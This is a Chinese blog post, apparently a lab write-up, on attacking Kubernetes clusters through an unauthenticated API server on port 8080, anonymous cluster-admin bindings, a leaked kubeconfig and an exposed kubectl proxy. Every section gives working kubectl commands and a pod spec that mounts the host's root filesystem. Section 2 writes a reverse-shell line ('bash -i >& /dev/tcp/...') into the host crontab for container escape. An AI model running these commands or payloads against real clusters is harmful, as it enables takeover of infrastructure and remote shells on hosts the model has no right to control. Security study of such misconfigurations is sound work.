---
title: k8s安全
url: https://mp.weixin.qq.com/s/tiEFGtikcTaIUIGtCCXxIA
source: Doonsec's feed
date: 2026-01-24
fetch_date: 2026-01-25T03:51:54.979013
---

# k8s安全

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgv3UWFDrz2BiagzpLN0u7AlWgiaJQx2cjJf9jUdSzEmabUXzXkNFz9QQw/0?wx_fmt=jpeg)

# k8s安全

原创

网安热爱者week
网安热爱者week

week的杂货铺

![]()

在小说阅读器中沉浸阅读

# 1. 认识k8s:

用来docker批量管理

自带负载均衡效果

master 管理者

node 节点（被管理的主机）

pod 节点内的容器

这里是网上搜到的两个图：

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgaDIiasuCDXzNU69o996NbeAmcsoIOumN9xKDRVkKd4UXYVK0umzWQJA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgBN7dnbJias9CNB5H4Znj5eQmEquTHJ1qfhRNqBA3vsulMPshaYJYlLQ/640?wx_fmt=png&from=appmsg)

本地的k8s配置：

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgBot2IZmDmjjdfNo8tGibUicNABg1QHD9W2L7b5kL1Qb1jsxQFv1Nw7sg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgIiaiaV4zLES83FUqwCbNV2hjT5rtbZqyP2U0BNpCPscEjiaUia9I27ehPA/640?wx_fmt=png&from=appmsg)

# 2. 旧版本8080未授权访问：

旧版本k8sAPI server会默认开启两个端口 8080和6443

6443是安全端口，安全端口使用TLS加密；

但是8080端口无需认证，仅用于测试。

6443端口需要认证，且有TLS保护。

k8s<1.16.0 时默认开启8080

新版本k8s默认已经不开启8080。需要更改相应的配置.

更改配置：

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgoZPMCYOLViaiaWQeZ8yRQMKIFoicTqmqA68GWb8ARbHpwaTYicnHD6q05A/640?wx_fmt=png&from=appmsg)

下面这种就是安全配置：（也是比较新的版本的默认配置）

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQg4nXPwp9MUUXHA8yy048F6ClPcZKcAKsOEtpnsicRpdu8icDDfA3QX1wA/640?wx_fmt=png&from=appmsg)

这种就是不安全的配置：

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgEz0EAbAkv3ELa7DsBzKCN0EsSicZbT2Nj6mUnErnqADhLC7qvzibichibA/640?wx_fmt=png&from=appmsg)

访问8080会出现：

api泄露：

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgcOvX19jBUFTXaHnZQR6ricicqGkEx2aP1cxDoIUCTVIkkAN8rX9aBia1g/640?wx_fmt=png&from=appmsg)

直接利用泄露的api获取nodes:

```
kubectl.exe -s 192.168.87.128:8080 get nodes
```

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgm3jS3ice04cVkMqBfyjEtBL9GUXiaxHku7GnPCVG2TrkUJMibdG5OOPpA/640?wx_fmt=png&from=appmsg)

本地写一个k8s的yaml配置文件：

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgvrQAlZdMzOTDtdrDnfEJV3S90kxcbKndaVol7QNU8JYK4ZCvMW13Tg/640?wx_fmt=png&from=appmsg)

```
apiVersion: v1kind: Podmetadata:  name: test01spec:  containers:    - image: nginx      name: test-container      volumeMounts:        - mountPath: /mnt          name: test-volume  volumes:    - name: test-volume      hostPath:        path: /
```

这个就是节点的/mnt目录挂载了主机的根目录

利用api新建节点：

```
kubectl.exe -s 192.168.87.128:8080 create -f ./test_poc.yaml
```

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgpUgn0FPxibTIZ3s0legn8Mb7uCHeBHJ4fzcMTtpukJEdjwcvPJbgawg/640?wx_fmt=png&from=appmsg)

发现成功创建：

```
kubectl.exe -s 192.168.87.128:8080 get pods
```

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgKibdypyESXGOS1hzQsfU2mCHLxUfTtVicoSyX1Laub5gpbj7icjdxHpUA/640?wx_fmt=png&from=appmsg)

进入这个刚刚搭建完成的pod:

```
kubectl -s 192.168.87.128:8080 --namespace=default exec -it test01 bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgeLZ79sdq4QKkmCuUwibtObJ5afVibgdMv08Omf6MWuWdMmTZBW6cib3xw/640?wx_fmt=png&from=appmsg)

因为这里是自己创建了相应的危险挂载容器

所以剩下的就是正常的容器逃逸了。

上线命令：

```
echo -e "* * * * * root bash -i >& /dev/tcp/192.168.87.136/4444 0>&1\n" >>/mnt/etc/crontab
```

nc -lvvp 监听就好

这里只展示成功逃逸：

容器内执行：
![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgDCm9Y9Jbq3eUG2NO1ol3j0LIe5icdic82e6QHoDJyWLYWh625ib0HwBJw/640?wx_fmt=png&from=appmsg)

node1的主机就可以看到逃逸成功了

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQglwkQb2djZLMp8NVKhjgYWSFTWUqFVF0h30bgfqnk2DwSVDdEQMVUOQ/640?wx_fmt=png&from=appmsg)

# 3. 鉴权逃逸：

api server未授权访问
如果访问443端口出现拒绝匿名访问就无法使用这个漏洞
一些集群由于鉴权配置不当，将"system:anonymous"用户绑定到"cluster-admin"用户组，

从而使6443端口允许匿名用户以管理员权限向集群内部下发指令。

假如管理员使用了：

```
kubectl create clusterrolebinding system:anonymous	--clusterrole=cluster-admin	--user=system:anonymous
```

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgOPA6Tg2mdL5Jb0fEY4mXRAfOF7nOnBSnZdpj7yNwPHPkYPAR7q2KQg/640?wx_fmt=png&from=appmsg)

就会出现直接访问返回api的情况：

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgVIIK6tfvdJVbEr82iaOOk5ZIJ7ALelQ3NXibXvicgWichtuWOuA19InKog/640?wx_fmt=png&from=appmsg)

这种基本就是安全的：

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQg7IQ1c9jJw7ack81a3OeqZCcWEpdVkQM24yGibCZcTBkw7JSyE6KxTEg/640?wx_fmt=png&from=appmsg)

## 3.1. 利用：

访问路由：
/api/v1/namespaces/default/pods

post json数据：

```
{"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"test02","namespace":"default"},"spec":{"containers":[{"image":"nginx:1.14.2","name":"test02","volumeMounts":[{"mountPath":"/host","name":"host"}]}],"volumes":[{"hostPath":{"path":"/","type":"Directory"},"name":"host"}]}}
```

使用bp抓包 改成json格式：

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQggziaFiaEVrZZ6licluAu2ibWRrZThMIeGA256qeqSYuFiaicNvhehy06kKSA/640?wx_fmt=png&from=appmsg)

就可以创建一个把主机的根目录挂载到/host的docker了

查看是否创建成功：（这里用户名密码随便输入）

```
kubectl --insecure-skip-tls-verify -s https://192.168.87.128:6443/ get pods
```

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgsNsLLjx8deTqPdlCicEiaofBrSRFmJrauyhHtlzDXqxpbt9MKS0ZE8iaA/640?wx_fmt=png&from=appmsg)

连接指定docker：

```
kubectl --insecure-skip-tls-verify -s https://192.168.87.128:6443/ --namespace=default exec -it test02 bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgxom2gf7aGicwyHkYTBb4GxWWYjGmoItCoxvDCwMy4fOqg2nJLoUZ2ng/640?wx_fmt=png&from=appmsg)

剩下的就和容器逃逸一样了：

```
touch /host/root/123.txt
```

# 4. 配置文件泄露：

configfile鉴权文件泄漏
攻击者通过webshell,github开源仓库等拿到了k8s配置的config文件，

从而操作集群，从而接管所有容器。

k8s configfile作为k8s集群的管理凭证，其中包含有关k8s集群的详细信息（apiserver,登录凭证）

如果攻击者能够访问到此文件（如办公网员工机器入侵，泄露到github的代码等）,就可以直接通过apiserver接管k8s集群，带来风险隐患

用户凭证保存在kubeconfig文件中，k8s通过以下顺序来我到kubeconfig文件：
如果提供了--kubeconfig参数，就使用提供的kubeconfig文件
如果没有提供--kubeconfig参数，但设置了环境变量$KUBECONFIG,则使用该环境变
量提供的kubeconfig文件
如果以上两种情况都没有，kubectl就使用默认的kubeconfig文件~/.kube/config

master里面有配置文件：
![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgPo6jMneuPv44C4QXpZkXkjGED74WPibPo02LQQClRnzcjPyJviasgy7Q/640?wx_fmt=png&from=appmsg)

这里就只是下载到kubectl的路径下

```
kubectl -s https://192.168.87.128:6443/ --kubeconfig=config --insecure-skip-tls-verify=true get nodes
```

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgLabpjyHYIdRWmHvVMMd7WHhdiajcqYB1wPpPO5rflGDTsYjtJwkul9A/640?wx_fmt=png&from=appmsg)

搞一个yaml文件 让它生成一个docker使得/mnt挂载宿主机根目录

```
kubectl -s https://192.168.87.128:6443/ --kubeconfig=config --insecure-skip-tls-verify=true apply -f test_poc.yaml -n default
```

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgEg3o63T4hnkNnSyJCkOFreoOKR5NVe6mTtdHDhd7ia6QQqyXMJuKYDQ/640?wx_fmt=png&from=appmsg)

```
kubectl -s https://192.168.87.128:6443/ --kubeconfig=config --insecure-skip-tls-verify=true exec -it test01 bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgJ8reAMNbQSNgakg3GHHv4KU1Plla8WUtW48BtCdgHddbkfHZQxicXBg/640?wx_fmt=png&from=appmsg)
剩下的就逃逸，懂得都懂了~~

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgu1J2G3nQM7j1fWLjeK64bcyr7uujZkhCzhmiayZFSnkiaLGCUHdcUDBg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgQIbVTJKx6BJo5BngF42vibHJGbGoWQIWyPRTeaZ9TJ2Rib6t09qlAsVQ/640?wx_fmt=png&from=appmsg)

# 5. 临时不安全proxy:

当运维人员需要某个环境暴露端口或者ip时，会用到kubectlproxy

```
kubectl --insecure-skip-tls-verify proxy --accept-hosts=^.*$ --address=0.0.0.0 --port=8009
```

复现利用：
类似某个不需认证的服务应用只能本地访问被代理出去后形成了外部攻击入口点。
\*找到暴露入口点，根据类型选择合适方案

```
kubectl -s http://192.168.87.128:8009 get pods -n kube-system
```

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNe3siaicF9J4icwnymEgevqQgIUExDot6HToNz9osEBb7m7tqLhfLGSOJiaLiaOsh7fXM2NP5MNLq1mAw/640?wx_fmt=png&from=appmsg)

创建pod是可以的：...